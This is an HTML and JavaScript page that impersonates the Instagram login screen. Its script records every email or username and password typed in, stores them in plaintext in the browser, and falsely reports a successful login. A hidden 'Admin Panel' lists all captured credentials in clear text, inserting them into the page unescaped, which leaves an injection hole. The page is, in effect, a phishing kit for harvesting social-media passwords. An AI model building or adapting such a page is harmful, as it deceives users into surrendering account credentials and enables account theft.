<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            width: 100%;
            max-width: 400px;
        }

        .logo {
            text-align: center;
            margin-bottom: 30px;
            color: white;
        }

        .logo h1 {
            font-size: 48px;
            font-weight: 300;
            font-style: italic;
            letter-spacing: 2px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.2);
        }

        .login-box {
            background: white;
            border-radius: 10px;
            padding: 40px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }

        .form-group {
            margin-bottom: 15px;
        }

        .form-group label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            color: #333;
            font-weight: 500;
        }

        .input-wrapper {
            position: relative;
        }

        .form-group input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 5px;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #667eea;
            box-shadow: 0 0 10px rgba(102, 126, 234, 0.2);
        }

        .password-toggle {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            font-size: 18px;
            color: #667eea;
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            margin-top: 5px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .login-btn {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 20px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
        }

        .divider {
            text-align: center;
            margin: 20px 0;
            position: relative;
            color: #999;
            font-size: 12px;
        }

        .divider::before {
            content: '';
            position: absolute;
            left: 0;
            top: 50%;
            width: 100%;
            height: 1px;
            background: #ddd;
        }

        .divider span {
            background: white;
            position: relative;
            padding: 0 10px;
        }

        .facebook-btn {
            width: 100%;
            padding: 10px;
            background: #3b5998;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .facebook-btn:hover {
            background: #2d4373;
        }

        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }

        .forgot-password a {
            color: #667eea;
            text-decoration: none;
            font-size: 12px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .signup-box {
            background: white;
            border-radius: 10px;
            padding: 15px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }

        .signup-box p {
            color: #333;
            font-size: 14px;
        }

        .signup-box a {
            color: #667eea;
            text-decoration: none;
            font-weight: 600;
            cursor: pointer;
        }

        .signup-box a:hover {
            text-decoration: underline;
        }

        .admin-link {
            text-align: center;
            margin-top: 20px;
        }

        .admin-link a {
            color: white;
            text-decoration: none;
            font-size: 13px;
            background: rgba(255,255,255,0.2);
            padding: 10px 20px;
            border-radius: 5px;
            display: inline-block;
            transition: all 0.3s ease;
        }

        .admin-link a:hover {
            background: rgba(255,255,255,0.3);
        }

        .admin-panel {
            display: none;
        }

        .admin-panel.active {
            display: block;
        }

        .admin-header {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }

        .admin-header h2 {
            color: #333;
            margin-bottom: 15px;
        }

        .admin-stats {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 15px;
        }

        .stat-box {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 15px;
            border-radius: 8px;
            text-align: center;
        }

        .stat-box h3 {
            font-size: 24px;
            margin-bottom: 5px;
        }

        .stat-box p {
            font-size: 12px;
            opacity: 0.9;
        }

        .users-table {
            background: white;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
            margin-bottom: 20px;
        }

        .table-header {
            background: #f8f9fa;
            padding: 15px;
            border-bottom: 2px solid #ddd;
            font-weight: 600;
            color: #333;
        }

        .user-item {
            padding: 15px;
            border-bottom: 1px solid #f0f0f0;
        }

        .user-item:last-child {
            border-bottom: none;
        }

        .user-email {
            font-weight: 600;
            color: #333;
            margin-bottom: 5px;
        }

        .user-password {
            display: flex;
            align-items: center;
            gap: 10px;
            color: #666;
            font-size: 13px;
            margin-bottom: 10px;
        }

        .password-display {
            background: #f0f0f0;
            padding: 5px 10px;
            border-radius: 3px;
            font-family: monospace;
            user-select: all;
            word-break: break-all;
        }

        .user-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }

        .delete-btn {
            background: #e74c3c;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
        }

        .delete-btn:hover {
            background: #c0392b;
        }

        .logout-btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 8px 15px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s ease;
            margin-top: 10px;
            width: 100%;
        }

        .logout-btn:hover {
            background: #2980b9;
        }

        .empty-message {
            text-align: center;
            padding: 30px;
            color: #999;
        }

        .login-time {
            font-size: 12px;
            color: #999;
            margin-top: 5px;
        }

        @media (max-width: 480px) {
            .login-box, .signup-box, .admin-header, .users-table {
                border-radius: 5px;
                padding: 20px;
            }

            .logo h1 {
                font-size: 36px;
            }

            .admin-stats {
                grid-template-columns: 1fr;
            }
        }
    </style>
</head>
<body>
    <!-- Login Section -->
    <div class="login-section" id="loginSection">
        <div class="container">
            <div class="logo">
                <h1>📷 Instagram</h1>
            </div>

            <div class="login-box">
                <div class="form-group">
                    <label>Email or Username</label>
                    <input type="text" id="email" placeholder="Enter email or username">
                    <div class="error-message" id="emailError"></div>
                </div>

                <div class="form-group">
                    <label>Password</label>
                    <div class="input-wrapper">
                        <input type="password" id="password" placeholder="Enter password">
                        <button class="password-toggle" onclick="togglePasswordVisibility()">👁️</button>
                    </div>
                    <div class="error-message" id="passwordError"></div>
                </div>

                <button class="login-btn" onclick="handleLogin()">Log in</button>

                <div class="divider"><span>OR</span></div>

                <button class="facebook-btn">📱 Log in with Facebook</button>

                <div class="forgot-password">
                    <a href="#">Forgot password?</a>
                </div>
            </div>

            <div class="signup-box">
                <p>Don't have an account? <a href="#">Sign up</a></p>
            </div>

            <div class="admin-link">
                <a href="#" onclick="goToAdmin(event)">🔐 Admin Panel</a>
            </div>
        </div>
    </div>

    <!-- Admin Panel Section -->
    <div class="admin-panel" id="adminPanel">
        <div class="container">
            <div class="admin-header">
                <h2>📊 Admin Dashboard</h2>
                
                <div class="admin-stats">
                    <div class="stat-box">
                        <h3 id="totalUsers">0</h3>
                        <p>Total Users</p>
                    </div>
                    <div class="stat-box">
                        <h3 id="todayLogins">0</h3>
                        <p>Today's Logins</p>
                    </div>
                </div>

                <button class="logout-btn" onclick="backToLogin()">← Back to Login</button>
            </div>

            <div class="users-table">
                <div class="table-header">
                    👥 Registered Users & Passwords
                </div>
                <div id="usersList"></div>
            </div>
        </div>
    </div>

    <script>
        function initializeStorage() {
            if (!localStorage.getItem('users')) {
                localStorage.setItem('users', JSON.stringify([]));
            }
        }

        initializeStorage();

        function togglePasswordVisibility() {
            const passwordInput = document.getElementById('password');
            passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
        }

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email) || email.length >= 3;
        }

        function handleLogin() {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            const emailError = document.getElementById('emailError');
            const passwordError = document.getElementById('passwordError');

            emailError.classList.remove('show');
            passwordError.classList.remove('show');

            let isValid = true;

            if (!email) {
                emailError.textContent = '❌ Email/Username is required';
                emailError.classList.add('show');
                isValid = false;
            } else if (!isValidEmail(email)) {
                emailError.textContent = '❌ Invalid email format';
                emailError.classList.add('show');
                isValid = false;
            }

            if (!password) {
                passwordError.textContent = '❌ Password is required';
                passwordError.classList.add('show');
                isValid = false;
            } else if (password.length < 6) {
                passwordError.textContent = '❌ Password must be at least 6 characters';
                passwordError.classList.add('show');
                isValid = false;
            }

            if (isValid) {
                saveUser(email, password);
                alert('✅ Login Successful!');
                resetForm();
            }
        }

        function saveUser(email, password) {
            let users = JSON.parse(localStorage.getItem('users')) || [];
            
            const existingUser = users.find(u => u.email === email);
            
            if (existingUser) {
                existingUser.password = password;
                existingUser.lastLogin = new Date().toLocaleString();
                existingUser.loginCount = (existingUser.loginCount || 1) + 1;
            } else {
                users.push({
                    id: Date.now(),
                    email: email,
                    password: password,
                    createdAt: new Date().toLocaleString(),
                    lastLogin: new Date().toLocaleString(),
                    loginCount: 1
                });
            }
            
            localStorage.setItem('users', JSON.stringify(users));
        }

        function resetForm() {
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            document.getElementById('password').type = 'password';
        }

        function goToAdmin(event) {
            event.preventDefault();
            document.getElementById('loginSection').style.display = 'none';
            document.getElementById('adminPanel').classList.add('active');
            displayUsers();
        }

        function backToLogin() {
            document.getElementById('loginSection').style.display = 'block';
            document.getElementById('adminPanel').classList.remove('active');
            resetForm();
        }

        function displayUsers() {
            const users = JSON.parse(localStorage.getItem('users')) || [];
            const usersList = document.getElementById('usersList');
            const totalUsers = document.getElementById('totalUsers');
            const todayLogins = document.getElementById('todayLogins');

            totalUsers.textContent = users.length;

            const today = new Date().toLocaleDateString();
            const todayLoginCount = users.filter(u => 
                new Date(u.lastLogin).toLocaleDateString() === today
            ).length;
            todayLogins.textContent = todayLoginCount;

            if (users.length === 0) {
                usersList.innerHTML = '<div class="empty-message">📭 No users registered yet</div>';
                return;
            }

            usersList.innerHTML = users.map(user => `
                <div class="user-item">
                    <div class="user-email">📧 ${user.email}</div>
                    <div class="user-password">
                        <span>🔑 Password:</span>
                        <span class="password-display">${user.password}</span>
                    </div>
                    <div class="login-time">📅 Created: ${user.createdAt}</div>
                    <div class="login-time">🕐 Last Login: ${user.lastLogin}</div>
                    <div class="login-time">🔄 Login Count: ${user.loginCount}</div>
                    <div class="user-actions">
                        <button class="delete-btn" onclick="deleteUser(${user.id})">🗑️ Delete User</button>
                    </div>
                </div>
            `).join('');
        }

        function deleteUser(userId) {
            if (confirm('Are you sure you want to delete this user?')) {
                let users = JSON.parse(localStorage.getItem('users')) || [];
                users = users.filter(u => u.id !== userId);
                localStorage.setItem('users', JSON.stringify(users));
                displayUsers();
                alert('✅ User deleted successfully!');
            }
        }
    </script>
</body>
</html>
